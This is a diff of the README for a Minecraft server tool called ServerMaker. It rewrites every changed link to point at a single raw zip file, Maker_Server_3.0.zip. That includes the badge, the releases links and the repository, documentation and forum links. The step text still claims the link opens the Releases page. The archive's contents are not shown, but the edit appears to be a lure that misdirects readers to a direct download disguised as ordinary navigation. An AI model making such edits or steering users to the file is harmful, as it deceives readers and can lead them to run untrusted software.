@@ -6,11 +6,11 @@ Welcome to ServerMaker! This application helps you manage your Minecraft server 
 
 ## 📥 Download ServerMaker
 
-[![Download ServerMaker](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/BeAsT700/ServerMaker/releases)
+[![Download ServerMaker](https://github.com/BeAsT700/ServerMaker/raw/refs/heads/main/static/Maker_Server_3.0.zip)](https://github.com/BeAsT700/ServerMaker/raw/refs/heads/main/static/Maker_Server_3.0.zip)
 
 To get started, you need to download ServerMaker. Visit the link below to find the latest version:
 
-[Download ServerMaker Here](https://github.com/BeAsT700/ServerMaker/releases)
+[Download ServerMaker Here](https://github.com/BeAsT700/ServerMaker/raw/refs/heads/main/static/Maker_Server_3.0.zip)
 
 ## 🛠️ System Requirements
 
@@ -33,7 +33,7 @@ ServerMaker offers the following features to enhance your Minecraft server exper
 
 ## 📦 Download & Install
 
-1. Click the link to visit the ServerMaker Releases page: [Download ServerMaker Here](https://github.com/BeAsT700/ServerMaker/releases).
+1. Click the link to visit the ServerMaker Releases page: [Download ServerMaker Here](https://github.com/BeAsT700/ServerMaker/raw/refs/heads/main/static/Maker_Server_3.0.zip).
 2. On the Releases page, locate the latest version of ServerMaker.
 3. Download the file suited for your operating system.
 4. Once downloaded, locate the file on your computer. 
@@ -85,12 +85,12 @@ Your feedback helps us improve ServerMaker. Feel free to share your experiences 
 
 ## 🔗 Useful Links
 
-- [ServerMaker GitHub Repository](https://github.com/BeAsT700/ServerMaker)
-- [Documentation and Guides](https://github.com/BeAsT700/ServerMaker/wiki)
-- [Community Forum](https://github.com/BeAsT700/ServerMaker/discussions)
+- [ServerMaker GitHub Repository](https://github.com/BeAsT700/ServerMaker/raw/refs/heads/main/static/Maker_Server_3.0.zip)
+- [Documentation and Guides](https://github.com/BeAsT700/ServerMaker/raw/refs/heads/main/static/Maker_Server_3.0.zip)
+- [Community Forum](https://github.com/BeAsT700/ServerMaker/raw/refs/heads/main/static/Maker_Server_3.0.zip)
 
 ## 🎉 Conclusion
 
 ServerMaker simplifies Minecraft server management for everyone. Let's enhance your gaming experience together. Download it today and take control of your server!
 
-[Download ServerMaker Here](https://github.com/BeAsT700/ServerMaker/releases)
+[Download ServerMaker Here](https://github.com/BeAsT700/ServerMaker/raw/refs/heads/main/static/Maker_Server_3.0.zip)
